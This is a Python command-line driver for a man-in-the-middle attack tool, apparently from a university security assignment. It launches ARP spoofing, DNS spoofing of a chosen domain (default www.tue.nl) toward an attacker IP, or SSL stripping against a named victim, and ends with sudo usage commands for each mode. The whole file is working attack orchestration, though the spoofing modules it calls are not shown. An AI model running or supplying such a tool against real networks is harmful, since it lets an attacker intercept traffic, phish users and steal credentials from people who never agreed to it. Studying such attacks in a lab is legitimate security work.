import sys
import time
import argparse
import threading
import os

import arp
import dns
import sslstrip

def main():
    parser = argparse.ArgumentParser(description="MITM Attack Tool: ARP, DNS Spoofing & SSL Stripping. Victim and Gateway IPs required.")
    
    # Required arguments
    parser.add_argument("--victim", required=True, help="IP address of the victim machine")
    parser.add_argument("--gateway", required=True, help="IP address of the gateway")

    # Mode selector
    parser.add_argument("--mode", required=True, choices=["arp", "dns", "ssl"], help="Attack mode: 'arp' for ARP Spoofing, 'dns' for DNS Spoofing, 'ssl' for SSL Stripping")

    # Arguments based on mode
    parser.add_argument("--attacker", required=True, help="IP address of the attacker machine (for DNS spoofing)")
    parser.add_argument("--target-domain", default="www.tue.nl", help="Domain to spoof (for DNS spoofing). Default: www.tue.nl")
    parser.add_argument("--interface", help="Network interface for SSL stripping e.g. ens33 (for SSL stripping)")
    args = parser.parse_args()


    if args.mode == "dns" and not args.attacker:
        print("[-] Attacker IP is required for DNS spoofing mode.")
        sys.exit(1)
    if args.mode == "ssl" and not args.interface:
        print("[-] Network interface is required for SSL stripping mode.")
        sys.exit(1)

    print(f"[+] Starting attack in [{args.mode.upper()}]... Press CTRL+C to stop")

    try:
        
        victim_mac = arp.get_mac(args.victim)
        gateway_mac = arp.get_mac(args.gateway)

        
        if not victim_mac or not gateway_mac:
            print("[-] Could not find MAC addresses. Exiting.")
            sys.exit(1)

        print(f"[+] Victim: {args.victim} ({victim_mac})")
        print(f"[+] Gateway: {args.gateway} ({gateway_mac})")

        # Start ARP Spoofing in a speerate thread
        arp_thread = threading.Thread(
            target=arp.start_arp_spoof, 
            args=(args.victim, args.gateway, victim_mac, gateway_mac),
            daemon=True
        )
        arp_thread.start()

        
        # ARP-Only mode
        if args.mode == 'arp':
            print("[+] Running in ARP-Only mode. Intercepting traffic without modification.")

        # Start DNS Spoofing if enabled
        elif args.mode == "dns":
            print(f"[+] Starting DNS Spoofing for domain {args.target_domain} to {args.attacker}...")
            dns_thread = threading.Thread(
                target=dns.start_dns_spoof,
                args=(args.victim, args.attacker, args.target_domain),
                daemon=True
            )
            dns_thread.start()

        # Start SSL Stripping if enabled
        elif args.mode == "ssl":
            print(f"[+] Starting SSL Stripping on {args.interface}...")
            sslstrip_thread = threading.Thread(
                target=sslstrip.start_sslstrip_sniff,
                args=(args.interface,),
                daemon=True
            )
            sslstrip_thread.start()

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[+] Stopping ARP Spoofing. Restoring network...")
        arp.restore(args.victim, victim_mac, args.gateway, gateway_mac)

if __name__ == "__main__":
    main()

# USAGE EXAMPLE:
# You need the victim IP, gateway IP, and attacker IP
# The attack can be run in three modes: ARP Spoofing mode, Phising mode (DNS Spoofing), or MITM mode (SSL Stripping)
# For ARP Spoofing mode:
# sudo python3 main.py --mode arp --victim <VICTIM_IP> --gateway <GATEWAY_IP>
# For Phising (DNS Spoofing) mode:
# sudo python3 main.py --mode dns --victim <VICTIM_IP> --gateway <GATEWAY_IP> --attacker <ATTACKER_IP> --target-domain <TARGET_DOMAIN>
# For MITM (SSL Stripping) mode:
# sudo python3 main.py --mode ssl --victim <VICTIM_IP> --gateway <GATEWAY_IP> --interface <NETWORK_INTERFACE>